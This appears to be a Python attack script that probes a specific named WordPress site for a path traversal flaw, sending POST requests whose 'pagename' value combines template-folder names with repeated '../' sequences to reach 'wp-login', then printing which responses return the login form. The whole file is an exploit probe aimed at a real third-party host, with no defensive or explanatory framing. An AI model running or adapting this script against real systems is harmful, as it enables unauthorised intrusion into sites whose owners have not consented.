from core import vuln

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"
pid = vuln._find_page(base)

def post(p):
    return vuln._req("POST", base + "/",
                     body=("page_id=%d&pagename=%s" % (pid, vuln._denc(p))).encode(), ctype=CT)

for td in ["page-template", "page-templates", "page-templates-full-width", "templates",
           "page", "page-full", "page-templates-2col", "page-tpl"]:
    pre = td[5:] if td.startswith("page-") else td
    for d in (3, 4, 5, 6):
        p = pre + "/" + "../" * d + "wp-login"
        try:
            r = post(p)
        except Exception as e:
            print(td, d, "EXC", type(e).__name__); continue
        t = r.text or ""
        print("%-26s d=%d %s len=%d login=%s" % (td, d, r.status_code, len(t), "user_login" in t))